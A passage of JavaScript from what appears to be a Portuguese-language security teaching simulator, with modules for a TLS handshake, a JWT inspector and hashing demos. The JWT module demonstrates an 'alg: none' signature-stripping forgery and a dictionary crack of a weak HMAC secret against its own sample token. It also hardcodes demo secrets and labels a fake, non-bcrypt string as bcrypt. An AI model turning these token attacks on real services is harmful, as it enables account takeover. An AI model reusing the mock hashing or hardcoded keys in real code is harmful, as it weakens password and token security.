     5. MÓDULO 3: TLS 1.3 / HTTPS HANDSHAKE & DIFFIE-HELLMAN (ECDHE)
     ========================================================================== */
  class TLSModule {
    constructor() {
      this.currentStep = 0; // 0 = idle, 1..5 = steps
      this.isPlaying = false;
      this.playInterval = null;
      this.speed = 1; // 0.5x, 1x, 2x
      this.snifferMode = 'http'; // 'http' ou 'https'

      // Parâmetros Diffie-Hellman
      this.g = 5;
      this.p = 23;
      this.a = 6;  // Segredo Cliente
      this.b = 15; // Segredo Servidor
      this.A = Math.pow(this.g, this.a) % this.p; // 8
      this.B = Math.pow(this.g, this.b) % this.p; // 19
      // K = 19^6 mod 23 = 2, ou 8^15 mod 23 = 2
      this.K = Math.pow(this.B, this.a) % this.p;

      // Elementos do DOM
      this.btnPlay = document.getElementById('btn-tls-play');
      this.btnStep = document.getElementById('btn-tls-step');
      this.btnReset = document.getElementById('btn-tls-reset');
      this.statusPill = document.getElementById('tls-status-pill');
      this.snifferFeed = document.getElementById('sniffer-feed-view');
      this.btnSniffHttp = document.getElementById('btn-sniff-http');
      this.btnSniffHttps = document.getElementById('btn-sniff-https');

      this.initEvents();
      this.updateSnifferView();
    }

    initEvents() {
      if (this.btnPlay) {
        this.btnPlay.addEventListener('click', () => {
          this.togglePlay();
        });
      }
      if (this.btnStep) {
        this.btnStep.addEventListener('click', () => {
          this.advanceStep();
        });
      }
      if (this.btnReset) {
        this.btnReset.addEventListener('click', () => {
          this.reset();
        });
      }

      // Velocidades
      const speedBtns = document.querySelectorAll('.tls-speed-btn');
      speedBtns.forEach(b => {
        b.addEventListener('click', () => {
          speedBtns.forEach(btn => btn.classList.remove('is-active'));
          b.classList.add('is-active');
          this.speed = parseFloat(b.getAttribute('data-speed') || '1');
          if (this.isPlaying) {
            this.stopPlay();
            this.startPlay();
          }
        });
      });

      // Sniffer Toggles
      if (this.btnSniffHttp) {
        this.btnSniffHttp.addEventListener('click', () => {
          this.setSnifferMode('http');
        });
      }
      if (this.btnSniffHttps) {
        this.btnSniffHttps.addEventListener('click', () => {
          this.setSnifferMode('https');
        });
      }
    }

    togglePlay() {
      if (this.isPlaying) {
        this.stopPlay();
      } else {
        if (this.currentStep >= 5) this.reset();
        this.startPlay();
      }
    }

    startPlay() {
      this.isPlaying = true;
      if (this.btnPlay) this.btnPlay.innerHTML = '<i class="fas fa-pause"></i> Pausar Handshake';
      const delay = 1800 / this.speed;

      this.advanceStep();
      this.playInterval = setInterval(() => {
        if (this.currentStep >= 5) {
          this.stopPlay();
        } else {
          this.advanceStep();
        }
      }, delay);
    }

    stopPlay() {
      this.isPlaying = false;
      if (this.btnPlay) this.btnPlay.innerHTML = '<i class="fas fa-play"></i> Iniciar Handshake TLS 1.3';
      if (this.playInterval) clearInterval(this.playInterval);
      this.playInterval = null;
    }

    advanceStep() {
      if (this.currentStep < 5) {
        this.currentStep++;
        this.renderStep(this.currentStep);
      }
    }

    renderStep(step) {
      // Destaca cards de passos
      for (let i = 1; i <= 5; i++) {
        const card = document.getElementById(`tls-step-${i}`);
        if (!card) continue;
        if (i < step) {
          card.className = 'tls-step-card is-completed';
        } else if (i === step) {
          card.className = 'tls-step-card is-active';
        } else {
          card.className = 'tls-step-card';
        }
      }

      // Logs e Status
      if (step === 1) {
        this.statusPill.innerHTML = '<i class="fas fa-spinner fa-spin text-cyan"></i> STATUS: NEGOCIANDO CIFRAS (CLIENT HELLO)';
        logger.log('CRYPTO', 'M3: TLS', 'ClientHello enviado. Versão TLS 1.3, Cipher Suites elegíveis e Chave Efêmera A transmitidos.');
      } else if (step === 2) {
        this.statusPill.innerHTML = '<i class="fas fa-spinner fa-spin text-emerald"></i> STATUS: CERTIFICADO X.509 VALIDADO (SERVER HELLO)';
        logger.log('CRYPTO', 'M3: TLS', 'ServerHello recebido. Certificado X.509 verificado contra Root CA. Chave Efêmera B recebida.');
      } else if (step === 3) {
        this.statusPill.innerHTML = '<i class="fas fa-arrows-split-up-and-left text-violet"></i> STATUS: SEGREDO K DERIVADO (DIFFIE-HELLMAN)';
        logger.log('CRYPTO', 'M3: TLS', `Diffie-Hellman calculado: K = B^a mod p = A^b mod p = ${this.K}. Sniffer na rede é incapaz de inferir K.`);
      } else if (step === 4) {
        this.statusPill.innerHTML = '<i class="fas fa-key text-cyan"></i> STATUS: CHAVE SIMÉTRICA AES-256-GCM EXPANDIDA (HKDF)';
        logger.log('CRYPTO', 'M3: TLS', 'HKDF expandiu o segredo K em chave simétrica de sessão de 256 bits com Forward Secrecy.');
      } else if (step === 5) {
        this.statusPill.innerHTML = '<i class="fas fa-lock text-emerald"></i> STATUS: CANAL SEGURO ATIVO (CADEADO VERDE)';
        this.setSnifferMode('https');
        logger.log('BLOCKED', 'M3: TLS', 'Handshake Finished! Tráfego de aplicação 100% cifrado contra interceptação de rede.');
      }
    }

    setSnifferMode(mode) {
      this.snifferMode = mode;
      if (this.btnSniffHttp && this.btnSniffHttps) {
        if (mode === 'http') {
          this.btnSniffHttp.classList.add('active-http');
          this.btnSniffHttps.classList.remove('active-https');
        } else {
          this.btnSniffHttp.classList.remove('active-http');
          this.btnSniffHttps.classList.add('active-https');
        }
      }
      this.updateSnifferView();
    }

    updateSnifferView() {
      if (!this.snifferFeed) return;

      if (this.snifferMode === 'http') {
        this.snifferFeed.innerHTML = `
          <div class="text-crimson font-mono" style="margin-bottom: 0.5rem;">
            [SNIFFER PACKET #4102] TCP 192.168.1.45:54210 ➔ 192.168.1.10:80 (HTTP TEXTO PURO)
          </div>
          <div style="color: var(--text-secondary); line-height: 1.4;">
            POST /api/v1/auth/login HTTP/1.1<br>
            Host: intranet.empresa.com.br<br>
            Authorization: Bearer <span class="text-crimson">eyJhbGciOiJIUzI1Ni...</span><br>
            Cookie: session_auth=<span class="text-crimson">SANDRO_SEC_AUTH_9981aef</span><br>
            Content-Type: application/json<br><br>
            <span class="text-crimson">{"user":"mariana","pass":"supersecret2026","transfer_amount":50000}</span>
          </div>
          <div style="margin-top: 0.5rem; color: var(--sec-crimson-bright); font-size: 0.7rem;">
            ⚠️ ALERTA FORENSE: Credenciais e tokens sensíveis capturados em texto claro pelo sniffer!
          </div>
        `;
      } else {
        this.snifferFeed.innerHTML = `
          <div class="text-emerald font-mono" style="margin-bottom: 0.5rem;">
            [SNIFFER PACKET #4108] TCP 192.168.1.45:54210 ➔ 192.168.1.10:443 (TLS 1.3 CIFRADO)
          </div>
          <div style="color: var(--sec-cyan-bright); line-height: 1.4; word-break: break-all;">
            4f a1 9c de 12 8b f3 01 77 9e aa 5c 3d 0b 88 c1 52 f9 07 6a e4 31 bb 89
            90 fc e2 18 c0 34 55 91 aa 7e 04 c2 6b df 11 82 49 98 13 de 5a 22 ff 09
            3b 71 a2 c8 11 dd 90 aa f4 50 19 c7 eb a8 21 00 cd e4 99 2f 14 02 81 cc
          </div>
          <div style="margin-top: 0.5rem; color: var(--sec-emerald-bright); font-size: 0.7rem;">
            🛡️ DADOS BLINDADOS: Tráfego cifrado com AES-256-GCM. Impossível decodificar sem a chave efêmera.
          </div>
        `;
      }
    }

    reset() {
      this.stopPlay();
      this.currentStep = 0;
      for (let i = 1; i <= 5; i++) {
        const card = document.getElementById(`tls-step-${i}`);
        if (card) card.className = 'tls-step-card';
      }
      this.statusPill.innerHTML = '<i class="fas fa-unlock text-crimson"></i> STATUS: CANAL DESPROTEGIDO (TEXTO PLANO)';
      this.setSnifferMode('http');
      logger.log('INFO', 'M3: TLS', 'Simulador de Handshake TLS reinicializado para estado desprotegido.');
    }
  }

  const tlsModule = new TLSModule();

  /* ==========================================================================
     6. MÓDULO 4: JWT (JSON WEB TOKEN) INSPECTOR & SIGNATURE FORGERY
     ========================================================================== */
  class JWTModule {
    constructor() {
      this.header = { alg: 'HS256', typ: 'JWT' };
      this.payload = {
        sub: 'usr_99812',
        name: 'Sandro Junior',
        role: 'user',
        email: 'sandro@soc.corp',
        iss: 'cybersec-auth-server',
        iat: Math.floor(Date.now() / 1000) - 3600,
        exp: Math.floor(Date.now() / 1000) + 86400
      };
      this.secret = 'sandro-super-secret-key-2026';
      this.currentSignature = '';
      this.isValid = true;

      // Elementos do DOM
      this.rawHeader = document.getElementById('jwt-raw-header');
      this.rawPayload = document.getElementById('jwt-raw-payload');
      this.rawSignature = document.getElementById('jwt-raw-signature');
      this.headerEditor = document.getElementById('jwt-header-editor');
      this.payloadEditor = document.getElementById('jwt-payload-editor');
      this.secretInput = document.getElementById('jwt-secret-input');
      this.statusCard = document.getElementById('jwt-status-card');
      this.statusIcon = document.getElementById('jwt-status-icon');
      this.statusMsg = document.getElementById('jwt-status-msg');
      this.btnAlgNone = document.getElementById('btn-jwt-alg-none');
      this.btnEscalate = document.getElementById('btn-jwt-escalate');
      this.btnDemote = document.getElementById('btn-jwt-demote');
      this.btnExpire = document.getElementById('btn-jwt-expire');
      this.btnResign = document.getElementById('btn-jwt-resign');
      this.btnBruteforce = document.getElementById('btn-jwt-bruteforce');
      this.bruteforceResult = document.getElementById('jwt-bruteforce-result');

      this.initEvents();
      this.updateEditors();
      this.calculateSignatureAndRender();
    }

    initEvents() {
      if (this.headerEditor) {
        this.headerEditor.addEventListener('input', () => {
          try {
            this.header = JSON.parse(this.headerEditor.value);
            this.verifyCurrentState();
          } catch (e) {
            this.setInvalidStatus('JSON do Header com erro de sintaxe.');
          }
        });
      }

      if (this.payloadEditor) {
        this.payloadEditor.addEventListener('input', () => {
          try {
            this.payload = JSON.parse(this.payloadEditor.value);
            this.verifyCurrentState();
          } catch (e) {
            this.setInvalidStatus('JSON do Payload com erro de sintaxe.');
          }
        });
      }

      if (this.secretInput) {
        this.secretInput.addEventListener('input', () => {
          this.secret = this.secretInput.value;
          this.verifyCurrentState();
        });
      }

      if (this.btnAlgNone) {
        this.btnAlgNone.addEventListener('click', () => {
          this.executeAlgNoneExploit();
        });
      }

      if (this.btnEscalate) {
        this.btnEscalate.addEventListener('click', () => {
          this.payload.role = 'admin';
          this.updateEditors();
          this.verifyCurrentState();
          logger.log('WARN', 'M4: JWT', 'Claim [role] alterada para "admin" no editor.');
        });
      }

      if (this.btnDemote) {
        this.btnDemote.addEventListener('click', () => {
          this.payload.role = 'user';
          this.updateEditors();
          this.verifyCurrentState();
        });
      }

      if (this.btnExpire) {
        this.btnExpire.addEventListener('click', () => {
          this.payload.exp = Math.floor(Date.now() / 1000) - 1000;
          this.updateEditors();
          this.verifyCurrentState();
          logger.log('WARN', 'M4: JWT', 'Claim [exp] forçada para timestamp expirado no passado.');
        });
      }

      if (this.btnResign) {
        this.btnResign.addEventListener('click', async () => {
          if (this.header.alg === 'none') {
            this.header = { alg: 'HS256', typ: 'JWT' };
            this.updateEditors();
          }
          await this.calculateSignatureAndRender();
          logger.log('CRYPTO', 'M4: JWT', 'Nova assinatura HMAC-SHA256 gerada legitimamente com o segredo.');
        });
      }

      if (this.btnBruteforce) {
        this.btnBruteforce.addEventListener('click', () => {
          this.executeWeakKeyBruteforce();
        });
      }
    }

    updateEditors() {
      if (this.headerEditor) this.headerEditor.value = JSON.stringify(this.header, null, 2);
      if (this.payloadEditor) this.payloadEditor.value = JSON.stringify(this.payload, null, 2);
    }

    // Base64URL Helpers Nativo Vanilla
    base64UrlEncode(strOrUint8) {
      let bytes;
      if (typeof strOrUint8 === 'string') {
        bytes = new TextEncoder().encode(strOrUint8);
      } else {
        bytes = strOrUint8;
      }

      let binary = '';
      for (let i = 0; i < bytes.byteLength; i++) {
        binary += String.fromCharCode(bytes[i]);
      }
      return btoa(binary)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
    }

    base64UrlDecode(str) {
      let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4) {
        b64 += '=';
      }
      const binary = atob(b64);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }
      return new TextDecoder().decode(bytes);
    }

    async calculateHmacSha256(dataStr, secretStr) {
      const enc = new TextEncoder();
      const keyData = enc.encode(secretStr);
      const cryptoKey = await window.crypto.subtle.importKey(
        'raw',
        keyData,
        { name: 'HMAC', hash: { name: 'SHA-256' } },
        false,
        ['sign', 'verify']
      );
      const signatureBuffer = await window.crypto.subtle.sign(
        'HMAC',
        cryptoKey,
        enc.encode(dataStr)
      );
      return this.base64UrlEncode(new Uint8Array(signatureBuffer));
    }

    updateAlgNoneButtonText() {
      if (!this.btnAlgNone) return;
      if (this.header.alg === 'none') {
        this.btnAlgNone.innerHTML = '<i class="fas fa-rotate-left"></i> Desativar Exploit (Restaurar HS256)';
        this.btnAlgNone.className = 'btn-sec btn-sec--outline';
      } else {
        this.btnAlgNone.innerHTML = '<i class="fas fa-bomb"></i> Ativar Exploit \'alg: none\'';
        this.btnAlgNone.className = 'btn-sec btn-sec--danger';
      }
    }

    async calculateSignatureAndRender() {
      try {
        const headerB64 = this.base64UrlEncode(JSON.stringify(this.header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(this.payload));
        const signingInput = `${headerB64}.${payloadB64}`;

        if (this.header.alg === 'none') {
          this.currentSignature = '';
          this.setAlgNoneStatus();
        } else {
          this.currentSignature = await this.calculateHmacSha256(signingInput, this.secret);
          this.setValidStatus('ASSINATURA ÍNTEGRA & VÁLIDA (HMAC-SHA256 CONFIRMADO)');
        }

        this.updateRawDisplay(headerB64, payloadB64, this.currentSignature);
        this.updateAlgNoneButtonText();
      } catch (err) {
        this.setInvalidStatus(`Erro no Web Crypto: ${err.message}`);
      }
    }

    async verifyCurrentState() {
      try {
        const headerB64 = this.base64UrlEncode(JSON.stringify(this.header));
        const payloadB64 = this.base64UrlEncode(JSON.stringify(this.payload));
        const signingInput = `${headerB64}.${payloadB64}`;

        this.updateRawDisplay(headerB64, payloadB64, this.currentSignature);
        this.updateAlgNoneButtonText();

        if (this.header.alg === 'none') {
          this.setAlgNoneStatus();
          return;
        }

        // Calcula qual seria a assinatura esperada com o segredo atual
        const expectedSig = await this.calculateHmacSha256(signingInput, this.secret);

        if (expectedSig === this.currentSignature) {
          this.setValidStatus('ASSINATURA ÍNTEGRA & VÁLIDA (HMAC-SHA256)');
        } else {
          this.setInvalidStatus('ASSINATURA INVÁLIDA / TOKEN VIOLADO (SIGNATURE MISMATCH)');
          logger.log('EXPLOIT', 'M4: JWT', 'Detecção de adulteração de token JWT! A assinatura informada não confere com o payload alterado.');
        }
      } catch (e) {
        this.setInvalidStatus('Falha ao validar assinatura.');
      }
    }

    updateRawDisplay(h, p, s) {
      if (this.rawHeader) this.rawHeader.textContent = h;
      if (this.rawPayload) this.rawPayload.textContent = p;
      if (this.rawSignature) this.rawSignature.textContent = s || '[SEM ASSINATURA]';
    }

    setValidStatus(msg) {
      this.isValid = true;
      if (this.statusCard) {
        this.statusCard.className = 'jwt-status-card jwt-status--valid';
        this.statusIcon.className = 'fas fa-shield-check text-emerald';
        this.statusMsg.textContent = msg;
      }
    }

    setInvalidStatus(msg) {
      this.isValid = false;
      if (this.statusCard) {
        this.statusCard.className = 'jwt-status-card jwt-status--invalid';
        this.statusIcon.className = 'fas fa-triangle-exclamation text-crimson';
        this.statusMsg.textContent = msg;
      }
    }

    setAlgNoneStatus() {
      this.isValid = false;
      if (this.statusCard) {
        this.statusCard.className = 'jwt-status-card jwt-status--none';
        this.statusIcon.className = 'fas fa-bomb text-amber';
        this.statusMsg.textContent = 'ALERTA: EXPLOIT "alg: none" ATIVO (ASSINATURA DESATIVADA)';
      }
    }

    executeAlgNoneExploit() {
      if (this.header.alg === 'none') {
        this.header = { alg: 'HS256', typ: 'JWT' };
        this.updateEditors();
        this.calculateSignatureAndRender();
        logger.log('INFO', 'M4: JWT', 'Exploit "alg: none" desativado. Algoritmo restaurado para HS256.');
        return;
      }

      this.header = { alg: 'none', typ: 'JWT' };
      this.payload.role = 'admin';
      this.updateEditors();
      this.calculateSignatureAndRender();
      logger.log('EXPLOIT', 'M4: JWT', 'Ataque "alg: none" injetado! Assinatura removida e perfil elevado para "admin".');
    }

    async executeWeakKeyBruteforce() {
      if (!this.bruteforceResult) return;

      if (this.header.alg === 'none') {
        this.bruteforceResult.className = 'jwt-bruteforce-result is-active';
        this.bruteforceResult.innerHTML = `
          <div class="text-amber font-mono" style="line-height: 1.6;">
            <div style="font-weight: 700; margin-bottom: 0.25rem;">
              <i class="fas fa-info-circle"></i> O token atual utiliza <strong>'alg: none'</strong> (sem assinatura).
            </div>
            <div style="font-size: 0.74rem; color: var(--text-secondary); margin-bottom: 0.5rem;">
              No exploit <code>alg: none</code>, a assinatura foi deliberadamente removida pelo atacante. Para demonstrar a <strong>quebra de chave fraca por dicionário</strong>, o token precisa ter uma assinatura HMAC ativa:
            </div>
            <button type="button" class="btn-sec btn-sec--primary" id="btn-fix-jwt-and-bruteforce" style="font-size: 0.75rem; padding: 0.35rem 0.8rem;">
              <i class="fas fa-bolt text-amber"></i> Assinar com chave "${this.secret}" e Quebrar Agora
            </button>
          </div>
        `;

        const fixBtn = document.getElementById('btn-fix-jwt-and-bruteforce');
        if (fixBtn) {
          fixBtn.addEventListener('click', async () => {
            this.header = { alg: 'HS256', typ: 'JWT' };
            this.updateEditors();
            await this.calculateSignatureAndRender();
            await this.executeWeakKeyBruteforce();
          });
        }

        logger.log('WARN', 'M4: JWT', 'Tentativa de teste de dicionário em token sem assinatura ("alg: none").');
        return;
      }

      const dictionary = [
        'password', '123456', 'admin', 'admin2026', 'jwt', 'secret',
        'qwerty', 'developer', 'sandro', 'sandrosec99', 'root', 'cybersec',
        'supersecret', 'letmein', 'sandro-super-secret-key-2026'
      ];

      this.bruteforceResult.className = 'jwt-bruteforce-result is-active';
      this.bruteforceResult.innerHTML = '<i class="fas fa-spinner fa-spin text-cyan"></i> Executando testes criptográficos via Web Crypto...';

      const headerB64 = this.base64UrlEncode(JSON.stringify(this.header));
      const payloadB64 = this.base64UrlEncode(JSON.stringify(this.payload));
      const signingInput = `${headerB64}.${payloadB64}`;

      const t0 = performance.now();
      let foundKey = null;

      for (const candidate of dictionary) {
        const candidateSig = await this.calculateHmacSha256(signingInput, candidate);
        if (candidateSig === this.currentSignature) {
          foundKey = candidate;
          break;
        }
      }

      const elapsed = (performance.now() - t0).toFixed(1);

      if (foundKey) {
        this.bruteforceResult.innerHTML = `
          <div class="text-crimson font-mono">
            <i class="fas fa-unlock"></i> SUCESSO! Segredo fraco quebrado em ${elapsed}ms: <strong>"${foundKey}"</strong>
          </div>
        `;
        logger.log('EXPLOIT', 'M4: JWT', `Brute-force de dicionário quebrou a chave HMAC em ${elapsed}ms! Segredo: "${foundKey}".`);
      } else {
        this.bruteforceResult.innerHTML = `
          <div class="text-emerald font-mono">
            <i class="fas fa-shield"></i> Dicionário esgotado em ${elapsed}ms. Nenhuma chave fraca encontrada.
          </div>
        `;
        logger.log('CRYPTO', 'M4: JWT', `Dicionário testado em ${elapsed}ms. Segredo possui alta entropia.`);
      }
    }

    reset() {
      this.header = { alg: 'HS256', typ: 'JWT' };
      this.payload = {
        sub: 'usr_99812',
        name: 'Sandro Junior',
        role: 'user',
        email: 'sandro@soc.corp',
        iss: 'cybersec-auth-server',
        iat: Math.floor(Date.now() / 1000) - 3600,
        exp: Math.floor(Date.now() / 1000) + 86400
      };
      this.secret = 'sandro-super-secret-key-2026';
      if (this.secretInput) this.secretInput.value = this.secret;
      if (this.bruteforceResult) this.bruteforceResult.className = 'jwt-bruteforce-result';
      this.updateEditors();
      this.calculateSignatureAndRender();
      logger.log('INFO', 'M4: JWT', 'Estado do JWT Inspector restaurado.');
    }
  }

  const jwtModule = new JWTModule();

  /* ==========================================================================
     7. MÓDULO 5: HASHING, SALT & RESISTÊNCIA A FORÇA BRUTA
     ========================================================================== */
  class HashModule {
    constructor() {
      this.input = document.getElementById('hash-input-text');
      this.btnRandom = document.getElementById('btn-hash-random');
      this.btnRegenSalts = document.getElementById('btn-regen-salts');
      this.btnBenchmark = document.getElementById('btn-run-benchmark');
      this.benchResult = document.getElementById('benchmark-result-banner');

      // Digests
      this.digestMd5 = document.getElementById('digest-md5');
      this.digestSha1 = document.getElementById('digest-sha1');
      this.digestSha256 = document.getElementById('digest-sha256');
      this.digestBcrypt = document.getElementById('digest-bcrypt');

      // Salt Scenario
      this.saltUser1Unsalted = document.getElementById('salt-user1-unsalted');
      this.saltUser2Unsalted = document.getElementById('salt-user2-unsalted');
      this.saltUser1Salted = document.getElementById('salt-user1-salted');
      this.saltUser2Salted = document.getElementById('salt-user2-salted');
      this.saltVal1 = document.getElementById('salt-val-1');
      this.saltVal2 = document.getElementById('salt-val-2');

      this.currentSalt1 = this.generateRandomHex(16);
      this.currentSalt2 = this.generateRandomHex(16);

      this.initEvents();
      this.updateAllHashes();
    }

    initEvents() {
      if (this.input) {
        this.input.addEventListener('input', () => {
          this.updateAllHashes();
        });
      }

      if (this.btnRandom) {
        this.btnRandom.addEventListener('click', () => {
          const words = ['delta', 'quantum', 'cipher', 'entropy', 'matrix', 'orbital', 'photon'];
          const rand = `${words[Math.floor(Math.random() * words.length)]}_${Math.floor(Math.random() * 9000 + 1000)}!`;
          this.input.value = rand;
          this.updateAllHashes();
          logger.log('CRYPTO', 'M5: Hash', `Nova senha gerada aleatoriamente (${rand}). Hashes recalculados.`);
        });
      }

      // Presets
      const presets = document.querySelectorAll('#panel-hash .preset-chip');
      presets.forEach(p => {
        p.addEventListener('click', () => {
          presets.forEach(c => c.classList.remove('active'));
          p.classList.add('active');
          this.input.value = p.getAttribute('data-hash-val') || '';
          this.updateAllHashes();
          logger.log('CRYPTO', 'M5: Hash', `Digests criptográficos recalculados para preset "${this.input.value}".`);
        });
      });

      if (this.btnRegenSalts) {
        this.btnRegenSalts.addEventListener('click', () => {
          this.currentSalt1 = this.generateRandomHex(16);
          this.currentSalt2 = this.generateRandomHex(16);
          this.updateSaltScenario();
          logger.log('CRYPTO', 'M5: Hash', 'Novos Salts CSPRNG de 128 bits gerados aleatoriamente.');
        });
      }

      if (this.btnBenchmark) {
        this.btnBenchmark.addEventListener('click', () => {
          this.runBenchmark();
        });
      }
    }

    generateRandomHex(bytesCount) {
      const array = new Uint8Array(bytesCount);
      window.crypto.getRandomValues(array);
      return Array.from(array).map(b => b.toString(16).padStart(2, '0')).join('');
    }

    async updateAllHashes() {
      const text = this.input ? this.input.value : '';

      // 1. MD5 puro Vanilla
      const md5Hex = this.calculateMd5(text);
      if (this.digestMd5) this.digestMd5.textContent = md5Hex;

      // 2. SHA-1 nativo Web Crypto
      const sha1Hex = await this.cryptoDigest('SHA-1', text);
      if (this.digestSha1) this.digestSha1.textContent = sha1Hex;

      // 3. SHA-256 nativo Web Crypto
      const sha256Hex = await this.cryptoDigest('SHA-256', text);
      if (this.digestSha256) this.digestSha256.textContent = sha256Hex;

      // 4. Bcrypt KDF Simulator
      const simulatedBcrypt = `$2b$12$${md5Hex.slice(0, 22)}${sha256Hex.slice(0, 31)}`;
      if (this.digestBcrypt) this.digestBcrypt.textContent = simulatedBcrypt;

      // 5. Atualiza cenário de Salt
      this.updateSaltScenario();
    }

    async updateSaltScenario() {
      const commonPass = 'senha123';
      const unsaltedHash = await this.cryptoDigest('SHA-256', commonPass);

      if (this.saltUser1Unsalted) this.saltUser1Unsalted.textContent = unsaltedHash;
      if (this.saltUser2Unsalted) this.saltUser2Unsalted.textContent = unsaltedHash;

      if (this.saltVal1) this.saltVal1.textContent = this.currentSalt1.slice(0, 8) + '...';
      if (this.saltVal2) this.saltVal2.textContent = this.currentSalt2.slice(0, 8) + '...';

      const saltedHash1 = await this.cryptoDigest('SHA-256', commonPass + this.currentSalt1);
      const saltedHash2 = await this.cryptoDigest('SHA-256', commonPass + this.currentSalt2);

      if (this.saltUser1Salted) this.saltUser1Salted.textContent = saltedHash1;
      if (this.saltUser2Salted) this.saltUser2Salted.textContent = saltedHash2;
    }

    async cryptoDigest(algorithm, text) {
      try {
        const enc = new TextEncoder();
        const buffer = await window.crypto.subtle.digest(algorithm, enc.encode(text));
        return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
      } catch (e) {
        return 'ERRO_DIGEST';
      }
    }

    // Implementação Vanilla Pura do RFC 1321 MD5
    calculateMd5(input) {
      function safeAdd(x, y) {
        const lsw = (x & 0xFFFF) + (y & 0xFFFF);
        const msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xFFFF);
      }
      function bitRol(num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
      }
      function md5cmn(q, a, b, x, s, t) {
        return safeAdd(bitRol(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);
      }
      function md5ff(a, b, c, d, x, s, t) {
        return md5cmn((b & c) | ((~b) & d), a, b, x, s, t);
      }
      function md5gg(a, b, c, d, x, s, t) {
        return md5cmn((b & d) | (c & (~d)), a, b, x, s, t);
      }
      function md5hh(a, b, c, d, x, s, t) {
        return md5cmn(b ^ c ^ d, a, b, x, s, t);
      }
      function md5ii(a, b, c, d, x, s, t) {
        return md5cmn(c ^ (b | (~d)), a, b, x, s, t);
      }

      const utf8 = unescape(encodeURIComponent(input));
      const words = [];
      for (let i = 0; i < utf8.length * 8; i += 8) {
        words[i >> 5] |= (utf8.charCodeAt(i / 8) & 0xFF) << (i % 32);
      }
      words[(utf8.length * 8) >> 5] |= 0x80 << ((utf8.length * 8) % 32);
      words[(((utf8.length * 8 + 64) >>> 9) << 4) + 14] = utf8.length * 8;

      let a = 1732584193;
      let b = -271733879;
      let c = -1732584194;
      let d = 271733878;

      for (let i = 0; i < words.length; i += 16) {
        const olda = a, oldb = b, oldc = c, oldd = d;

        a = md5ff(a, b, c, d, words[i + 0], 7, -680876936);
        d = md5ff(d, a, b, c, words[i + 1], 12, -389564586);
        c = md5ff(c, d, a, b, words[i + 2], 17, 606105819);
        b = md5ff(b, c, d, a, words[i + 3], 22, -1044525330);
        a = md5ff(a, b, c, d, words[i + 4], 7, -176418897);
        d = md5ff(d, a, b, c, words[i + 5], 12, 1200080426);
        c = md5ff(c, d, a, b, words[i + 6], 17, -1473231341);
        b = md5ff(b, c, d, a, words[i + 7], 22, -45705983);
        a = md5ff(a, b, c, d, words[i + 8], 7, 1770035416);
        d = md5ff(d, a, b, c, words[i + 9], 12, -1958414417);
        c = md5ff(c, d, a, b, words[i + 10], 17, -42063);
        b = md5ff(b, c, d, a, words[i + 11], 22, -1990404162);
        a = md5ff(a, b, c, d, words[i + 12], 7, 1804603682);
        d = md5ff(d, a, b, c, words[i + 13], 12, -40341101);
        c = md5ff(c, d, a, b, words[i + 14], 17, -1502002290);
        b = md5ff(b, c, d, a, words[i + 15], 22, 1236535329);

        a = md5gg(a, b, c, d, words[i + 1], 5, -165796510);
        d = md5gg(d, a, b, c, words[i + 6], 9, -1069501632);
        c = md5gg(c, d, a, b, words[i + 11], 14, 643717713);
        b = md5gg(b, c, d, a, words[i + 0], 20, -373897302);
        a = md5gg(a, b, c, d, words[i + 5], 5, -701558691);
        d = md5gg(d, a, b, c, words[i + 10], 9, 38016083);
        c = md5gg(c, d, a, b, words[i + 15], 14, -660478335);
        b = md5gg(b, c, d, a, words[i + 4], 20, -405537848);
        a = md5gg(a, b, c, d, words[i + 9], 5, 568446438);
        d = md5gg(d, a, b, c, words[i + 14], 9, -1019803690);
        c = md5gg(c, d, a, b, words[i + 3], 14, -187363961);
        b = md5gg(b, c, d, a, words[i + 8], 20, 1163531501);
        a = md5gg(a, b, c, d, words[i + 13], 5, -1444681467);
        d = md5gg(d, a, b, c, words[i + 2], 9, -51403784);
        c = md5gg(c, d, a, b, words[i + 7], 14, 1735328473);
        b = md5gg(b, c, d, a, words[i + 12], 20, -1926607734);

        a = md5hh(a, b, c, d, words[i + 5], 4, -378558);
        d = md5hh(d, a, b, c, words[i + 8], 11, -2022574463);
        c = md5hh(c, d, a, b, words[i + 11], 16, 1839030562);
        b = md5hh(b, c, d, a, words[i + 14], 23, -35309556);
        a = md5hh(a, b, c, d, words[i + 1], 4, -1530992060);
        d = md5hh(d, a, b, c, words[i + 4], 11, 1272893353);
        c = md5hh(c, d, a, b, words[i + 7], 16, -155497632);
        b = md5hh(b, c, d, a, words[i + 10], 23, -1094730640);
        a = md5hh(a, b, c, d, words[i + 13], 4, 681279174);
        d = md5hh(d, a, b, c, words[i + 0], 11, -358537222);
        c = md5hh(c, d, a, b, words[i + 3], 16, -722521979);
        b = md5hh(b, c, d, a, words[i + 6], 23, 76029189);
        a = md5hh(a, b, c, d, words[i + 9], 4, -640364487);
        d = md5hh(d, a, b, c, words[i + 12], 11, -421815835);
        c = md5hh(c, d, a, b, words[i + 15], 16, 530742520);
        b = md5hh(b, c, d, a, words[i + 2], 23, -995338651);

        a = md5ii(a, b, c, d, words[i + 0], 6, -198630844);
        d = md5ii(d, a, b, c, words[i + 7], 10, 1126891415);
        c = md5ii(c, d, a, b, words[i + 14], 15, -1416354905);
        b = md5ii(b, c, d, a, words[i + 5], 21, -57434055);
        a = md5ii(a, b, c, d, words[i + 12], 6, 1700485571);
        d = md5ii(d, a, b, c, words[i + 3], 10, -1894986606);
        c = md5ii(c, d, a, b, words[i + 10], 15, -1051523);
        b = md5ii(b, c, d, a, words[i + 1], 21, -2054922799);
        a = md5ii(a, b, c, d, words[i + 8], 6, 1873313359);
        d = md5ii(d, a, b, c, words[i + 15], 10, -30611744);
        c = md5ii(c, d, a, b, words[i + 6], 15, -1560198380);
        b = md5ii(b, c, d, a, words[i + 13], 21, 1309151649);
        a = md5ii(a, b, c, d, words[i + 4], 6, -145523070);
        d = md5ii(d, a, b, c, words[i + 11], 10, -1120210379);
        c = md5ii(c, d, a, b, words[i + 2], 15, 718787259);
